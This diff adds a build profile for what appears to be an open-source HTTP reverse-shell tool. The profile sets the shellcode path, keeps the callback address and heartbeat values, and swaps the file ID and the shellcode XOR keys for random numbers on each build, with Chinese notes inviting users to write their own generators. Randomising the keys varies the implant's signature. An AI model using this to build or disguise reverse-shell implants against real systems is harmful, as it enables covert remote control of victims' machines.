@@ -1,0 +1,23 @@
+projectPath='HttpReverseShell' # 项目路径
+slnPath='HttpReverseShell.sln' # 解决方案
+shellcodePath='bin\\Interpreter.bin' # ShellCode 路径
+HttpReverseShell.cpp
+[FID]->rand(9999)
+1.5->1.5
+0.5->0.5
+127.0.0.1->127.0.0.1
+1234->1234
+CommandController.cpp
+255, 255->xor1, xor2
+End
+
+Profile 简陋的原因：
+1. 开发时间紧张。
+2. 项目开源，代码简洁，易于源码级二开。
+可自行在 Generator 文件夹下开发自己的生成器脚本与 Profile。
+
+当前 Profile 含义：
+1. 前三行用于定义变量。
+2. 后面将两个代码文件中的字符串进行替换。
+将 HttpReverseShell.cpp 中的文件 ID 替换为随机数，心跳、请求目标等信息不变。
+将 CommandController.cpp 中的解释器 ShellCode 密钥替换为两个不同的随机数。
